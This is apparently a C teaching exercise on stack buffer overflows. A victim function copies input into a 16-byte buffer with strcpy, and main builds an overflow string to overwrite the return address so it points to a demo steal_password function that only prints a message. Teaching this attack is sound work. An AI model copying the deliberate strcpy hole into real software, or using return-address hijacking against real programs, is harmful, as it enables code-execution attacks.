#include "stdint.h"
#include "stdio.h"
#include "stdlib.h"
#include "string.h"
#include "util.h"

// In this program, there are a few important functions.
// Consider victim as a utility function that exists in some large codebase somewhere, that someone built
// without considering it's security implications. 
// This victim function accepts a str pointer, and copies the content of this str pointer
// to a local buffer that has a fixed value of 16 characters. 
// The first question you should ask is, what happens if your input string is more than 16 bytes?
// The answer is, strcpy is a function that continues copying this until it encounters a null character.
// That is, it does not stop when the buffer is full. Instead, it continues incrementing the addresses
// of both, the buffer and str as it iterates over the input string, OVERWRITING ANYTHING IN ITS PATH!

// What happens if the return address is in the path of this buffer pointer?
// Well, it will be overwritten with whatever the string contains.
// So when the function returns, you will jump to whatever you wrote to the address of the return pointer
// This means you can controll where the user returns by controling the input to this function!

// OUR GOAL: make victim return to steal password instead of main!    <--- Your objective! 


void victim(char* str)
{
    char buf[16];

    strcpy(buf, str);

    return;
}


// Steal password is a function that lives in the same program as the victim function (obviously). 
// Naturally, code that you may be attacking will not convinently have malicous functions that 
// leak critical information of the program, but we just make this assumption for now.
// Exercise 2 demonstrates that there are many ways around this assumption,
// including executing shell code, return-oriented-programing, and others. 
// In any case, consider steal function as code you want to execute, but will never actually run
// unless you trick the program into doing so. 

void steal_password()
{
    printf("\033[1;31mSuccess! Malicious function Called!\033[0m\n");
    return;
}


void append_address(char* buf, int i, uint64_t addr)
 {

    // buf: pointer to buffer space
    // i: offset from base of this buffer space
    // addr: the payload/evil function address

    // NOTE: Address is stored as little endian, hence the swip-swapping

    buf[i + 0] = (char)((addr >> 0) & 0xFF);
    buf[i + 1] = (char)((addr >> 8) & 0xFF);
    buf[i + 2] = (char)((addr >> 16) & 0xFF);
    buf[i + 3] = (char)((addr >> 24) & 0xFF);
    buf[i + 4] = (char)((addr >> 32) & 0xFF);
    buf[i + 5] = (char)((addr >> 40) & 0xFF);
    buf[i + 6] = (char)((addr >> 48) & 0xFF);
    buf[i + 7] = (char)((addr >> 56) & 0xFF);
    // Don't add null terminator - we want the full address
    return;
}



// This program operates in the following way:
// you run ./src/main <addr offset>
// where addr offset is the number of bytes from the function pointer in which you will be writing 
// the pointer to the evil function. 
int main(int argc, char* argv[])
{

    // This just checks if you ran the program correctly...
    if (argc < 2) { // argc is the number (count) of args the program recieved. 
        // the name of the program is 1, the number of bytes is the second
        // terminate the program if you ran the code incorrectly. 
        printf("Error: Please pass test size!\n");
        printf("Ex: ./src/main <addr offset in bytes>\n");
        return -1;
    }

    int address_start_byte = atoi(argv[1]); // the C program recieves input ints as strings. Convert the input to an int. 


    //////////////////////////////////
    // "MEAT" OF THE EXERCISE BELOW //
    //////////////////////////////////


    // Get the raw pointer value for the malicious function. 
    // This is the "payload" you want to write at the correct location
    // to hijack program execution
    uint64_t function_addr = (uint64_t)(steal_password);
    printf("Target Function Ptr: 0x%lx\n", function_addr);


    // Fill everything up to starting target addr with 0x41 ("A")
    // You need to do this to ensure there are no premature terminator/null bytes
    char evil_str[128];
    for (int j = 0; j < 128; j++) evil_str[j] = 0x41;  // Fill entire buffer
    
 //   append_address(evil_str, address_start_byte, function_addr);
// I added the following call instead
    append_address(evil_str, 0, 0xdeadbeef);

    hexdump_arr(evil_str);   // Uncomment for debug

    // Call the victim with normal input
    victim("0123456789ABCDE"); // Normal input of expected length == 16. No issues here

    // Now, call the victim with a malicious input
    victim(evil_str);

    return 0;
}


